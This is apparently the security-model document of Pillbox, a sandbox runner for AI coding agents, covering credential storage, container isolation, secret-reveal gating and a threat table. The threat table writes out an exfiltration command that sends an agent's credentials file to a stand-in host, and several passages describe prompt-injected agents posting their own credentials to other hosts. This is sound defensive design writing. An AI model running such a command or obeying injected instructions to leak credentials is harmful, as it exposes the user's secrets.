# Security model

Pillbox is a **sandbox runner**, not a secrets manager. The right way
to evaluate it is to compare its posture against tools in the same
class: `gh`, `aws`, `docker`, `kubectl`. They all store credentials as
plaintext files at 0600 under the user's home, and rely on the host's
disk encryption for at-rest defense. Pillbox does the same.

> **⚠️ Direction (2026-06-01): the isolation boundary is moving Docker → libkrun
> microVM** (see [libkrun-sandbox.md](./libkrun-sandbox.md)). Everything below
> describes the **shipped Docker** posture — shared-kernel containers, so
> container-escape / kernel attacks are explicitly out of scope (rows below).
> libkrun makes the boundary a **hardware VM** (KVM/HVF), closing exactly that
> gap, and folds in **vault v2** (credential substitution only on a TLS handshake
> verified to an allowlisted host + default-deny egress) and **non-negotiable
> secret-file exclusion**. Don't read the rows below as the *target* posture —
> they're what ships today; the spec is the target.

> **Two gaps the vNext work must address** (tracked in [vnext.md](./vnext.md) /
> [remotes-redesign.md](./archive/remotes-redesign.md)): (1) the vault MITMs only
> Anthropic/OpenAI/GitHub and **passes all other hosts through unmodified**
> (`vault/server.rs:6`) — an agent can exfiltrate any other secret to an
> unmatched host; the planned fix is strict-deny egress filtering (403 on
> unmatched). This also bounds the [swarm-memory](./swarm-memory.md) privacy
> scrub: exact-match against vaulted secrets is **zero-false-negative only for
> known-provider hosts under strict-deny**, making strict-deny a **prerequisite
> for any cross-user pooling**. (2) the
> proposed per-session **blob store of raw, unredacted LLM bodies (incl.
> reasoning)** is a new at-rest sensitive surface not yet in this threat model —
> add it before that capture path ships.

## What pillbox defends against

| Threat | How pillbox mitigates |
|---|---|
| Agent reads `~/.claude` or `~/.codex` on the host | Sandbox only mounts the resolved auth pillbox's `auth/<agent>/` dir; the agent never sees the host's real config directories. |
| Agent reads host environment variables | Container env is built from `pillbox` flags only. The host's `$ANTHROPIC_API_KEY` etc. don't leak in. |
| Login flow contaminated by host state | The login container is one-shot and fresh — no prior state mounted. |
| Other host tools accidentally consuming pillbox state | Everything is namespaced under `~/.pillbox/` with restrictive perms. |
| `pillbox secret show --reveal` accidentally piped to logs | Refused unless `--to-stdout` is also passed. |
| Sandbox escape via the runner image | Standard Docker isolation. The runner image is the same one lum uses for its sandboxed agents — small attack surface, no inbound ports. |

## What pillbox does NOT defend against

| Threat | Why pillbox can't help |
|---|---|
| Prompt-injected agent exfiltrating its OWN credentials | The agent was given the credential on purpose. A malicious instruction telling it to `curl evil.com -d @~/.credentials.json` works. v0.4's vault tier replaces API keys with stubs + egress proxy; OAuth subscription tokens stay mounted because they're useless without the host's `claude` binary. |
| Stolen unencrypted disk / backup | Files are plaintext at 0600. If FileVault / LUKS / BitLocker isn't on, an attacker with the disk has the secrets. Same posture as `~/.aws/credentials`. |
| Compromised Docker daemon | Pillbox uses standard `docker run` today. A root-equivalent Docker compromise is out of scope. *Direction:* the [libkrun pivot](./libkrun-sandbox.md) removes the Docker daemon from the trust path entirely (no daemon — a linked library + a microVM). |
| Kernel-level or hypervisor attacks | Docker shares the host kernel — out of scope today. *Direction:* [libkrun](./libkrun-sandbox.md) puts the agent behind a hardware-VM boundary (KVM/HVF), which is the answer at this tier — no remote host needed. |
| Multi-user separation on a shared host | One secret store per OS user. 0600 blocks other non-root users from reading; a root user on the host bypasses it. |

## Where data lives (v0.6)

```
~/.pillbox/                          # 0700, parent enforced by paths::pillbox_root
├── global/                          # 0700 — global pillbox
│   ├── secrets/<NAME>               # 0600 — plaintext value
│   ├── env/<NAME>                   # 0600 — raw .env content
│   ├── auth/                        # 0700 — agent OAuth state (shared)
│   │   ├── claude/                  # 0700 — claude's HOME between runs
│   │   │   ├── .claude/
│   │   │   │   ├── .credentials.json    # OAuth tokens (0600)
│   │   │   │   └── settings.json
│   │   │   └── .claude.json             # profile config
│   │   └── codex/                   # 0700 — codex's HOME between runs
│   │       └── .codex/
│   │           ├── auth.json
│   │           └── config.toml
│   ├── vault/                       # 0700 — CA + key for vault sessions
│   └── sessions/                    # 0700 — detached-session records
├── projects/                        # 0700
│   └── -Users-x-work-myapp/         # 0700 — one per project pillbox
│       ├── meta.json                # 0600 — descriptor mirror (incl. workspace)
│       ├── secrets/                 # overrides global on key conflict
│       ├── env/
│       ├── auth/                    # reserved (v0.7 per-project override)
│       ├── vault/                   # 0700 — CA + key
│       ├── sessions/                # sessions started here
│       ├── repo-password            # 0600 — rustic encryption password
│       └── repo/                    # local rustic repository
└── cache/                           # 0700
```

Every directory under `~/.pillbox/` is created via the paths helpers
which idempotently re-apply 0700 — so even if a user runs `chmod -R
755 ~/.pillbox` by accident, the next pillbox invocation tightens it
back. `pillbox doctor` flags any remaining loose perms.

`pillbox doctor` also flags the v0.5 layout if it's still present
(`~/.pillbox/data/`, `~/.pillbox/secrets/`, etc. at the top level).
v0.6 commands refuse to run until that's moved aside — see the README
section "Hard reset from v0.5".

## Why files, not Keychain / DPAPI / libsecret

| Reason | Detail |
|---|---|
| Cross-OS symmetry | Linux containers don't have Keychain; a file-based primary was needed anyway. |
| Small marginal protection | Keychain defends against another local user. On a single-user laptop with FileVault, that's not the real attacker. |
| Mental-model parity | `~/.aws/credentials`, `~/.gh/hosts.yml`, `~/.docker/config.json` are all files. One tool hiding state in an opaque store surprises both users and agents. |

If you need OS-vault-grade protection for a specific value, store it in
the OS keychain yourself and pass it in with `--from-env`:

```sh
ANTHROPIC_API_KEY=$(security find-generic-password -s anthropic -w) \
  pillbox secret add ANTHROPIC_API_KEY --from-env ANTHROPIC_API_KEY
```

That still ends up in `~/.pillbox/secrets/` at 0600 — but the keychain
remains the source of truth, and you can re-derive after `pillbox
secret rm`.

## Reveal model in detail

`pillbox secret show` masks by default. `--reveal` unmasks, but only
if stdout is a TTY. If you want the raw value into a pipe / file /
subshell, add `--to-stdout`:

| Command | Behavior |
|---|---|
| `pillbox secret show NAME` | Last 4 chars; rest `*` |
| `pillbox secret show NAME --reveal` (TTY) | Full plaintext |
| `pillbox secret show NAME --reveal` (pipe) | Refused, exit 2 |
| `pillbox secret show NAME --reveal --to-stdout` | Full plaintext, always |

The gate exists because the common mistakes (logging, screen-sharing
into a recording, accidentally tee'ing into a file) all involve
non-TTY stdout. Requiring `--to-stdout` makes the leak deliberate.

Same model for `pillbox env show`.

## Sandbox isolation in detail

Each `pillbox run` invocation launches a fresh container with:

- `--rm` so it's deleted on exit. No state persists in the container.
- A clean `/home/pillbox` populated by bind-mounting the resolved auth
  pillbox's `auth/<agent>/` directory (e.g.
  `~/.pillbox/global/auth/claude/`). The agent only sees its OWN
  persistent HOME, not the user's real `~/.claude` / `~/.codex`.
- A workspace bind mount at `/workspace/<name>` (defaults to cwd).
- Env vars composed from `--env BUNDLE` → `--env-file PATH` → `--with
  NAME` only. The host's environment doesn't leak in.
- `PATH=/usr/local/bin:/usr/bin:/bin:$HOME/.local/bin` — the runtime
  image's binaries take precedence over anything an agent might write
  into `$HOME/.local/bin`.

The login flow is the same shape, except no workspace mount and no
secret/env injection — it's just `pillbox auth login --agent <agent>`
running the agent's OAuth flow in a one-shot container.

## Sessions (detach + reattach)

A detached session runs entirely on the local host — a long-lived
sandbox (Docker container or libkrun microVM) plus a local session
record. There is no remote host and nothing crosses the network at
session start. `--detach` does not support `--vault`: the host-side
MITM proxy can't outlive the CLI, so a vaulted run must stay in the
foreground.

`pillbox session detach <id>` SIGTERMs the `attached_pid` recorded
in the session TOML. The recorded pid is validated before
signalling:

- Refused if `pid <= 1` (init / reserved).
- Refused if it equals the calling process's own pid.
- A `kill(pid, 0)` liveness probe runs first — on `ESRCH` (no such
  process), the stale `attached_pid` stamp is cleared and the
  command exits successfully without sending SIGTERM. This
  defeats pid-reuse against a session whose previous attacher
  crashed.

Session records themselves contain only opaque resource handles
(sandbox ids, pids) — no credentials, no secrets. The threat from
exposure of a session record is "can a co-tenant on the host hijack
the session?" — they'd need access to the local Docker socket /
libkrun process the sandbox runs under, which the host's own perms
gate; the record alone grants nothing.

## Threat model honesty

The biggest unmitigated threat is **the agent doing what you told it
to do, but for a malicious instruction**. If a prompt injection tells
claude to read its own credentials and POST them somewhere, claude
will. Pillbox makes this harder by:

- Not handing the agent the host's credentials (only its own).
- Stripping host env vars by default.
- Optionally mediating egress through the local `--vault` MITM
  stub-swap proxy, which keeps real OAuth tokens / API keys on the
  host and hands the sandbox stubs (see [vault.md](./vault.md)).

But ultimately: **don't run untrusted prompts against an agent that
holds production credentials**. That's a policy decision pillbox
can't make for you.

## See also

- [secrets.md](./secrets.md) — secret/env-bundle storage, reveal model, precedence rules
- [recipes.md](./recipes.md) — copy-paste flows including rotation and forgetting
- [../AGENTS.md](../AGENTS.md) — agent-facing command reference

## Reporting issues

See [../SECURITY.md](../SECURITY.md) at the repo root for the
disclosure policy and reporting channels.
